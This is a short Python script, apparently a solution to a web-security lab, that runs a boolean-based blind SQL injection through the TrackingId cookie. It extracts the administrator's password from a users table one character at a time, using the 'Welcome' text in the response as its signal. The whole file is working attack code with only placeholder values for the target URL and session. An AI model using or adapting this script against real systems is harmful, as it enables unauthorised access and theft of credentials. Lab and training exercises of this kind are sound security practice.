import requests
import string

chars = string.ascii_lowercase+string.digits
url = "YOUR_LAB_URL"
counter=1
password=""
while True :
    for char in chars:
        with requests.session() as sess:
            r = sess.get(url, cookies={
                "TrackingId":f"YOUR_TRACKING_ID'+and+(select+substring(password,{counter},1)+from+users+where+username='administrator')='{char}'--+-;",
                "session":"YOUR_SESSION"
            })
        if("Welcome" in r.text):
            password = password+char
            counter=counter+1
            print(password)
    if(len(password) == 20):
        break
